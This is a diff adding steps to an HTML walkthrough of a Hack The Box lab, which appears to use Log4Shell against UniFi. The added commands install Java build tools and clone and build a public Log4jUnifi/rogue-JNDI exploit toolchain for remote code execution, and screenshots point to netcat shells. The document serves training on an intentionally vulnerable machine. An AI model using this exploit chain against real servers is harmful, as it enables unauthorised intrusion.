@@ -121,7 +121,18 @@ For a further look, use tcpdump to monitor your own 389 port.<br>
 <b>cmd</b>：<code>tcpdump -i tun0 port 389</code><br>
 If the target is really vulnerable, after the injection is executed, it will connect to our ldap (389 port).<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump3.png" alt="tcpdump3" width="60%">
+We will have to install <code>Open-JDK</code> and <code>Maven</code> on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.<br>
+<pre class="text">
+sudo apt-get install openjdk-11-jdk -y
+sudo apt-get install maven
+</pre>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/version.png" alt="version" width="60%">
+Once we have installed the required packages, we now need to download and build the <code>Rogue-JNDI</code> Java application.<br>
+Let's clone the respective repository and build the package using Maven.<br>
+<pre class="text">
+git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ && cd Log4jUnifi && pip3 install -r requirements.txt
+mvn package -f utils/rogue-jndi/
+</pre>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/exploit.py.png" alt="exploit" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/nc1.png" alt="nc1" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/nc2.png" alt="nc2" width="60%">
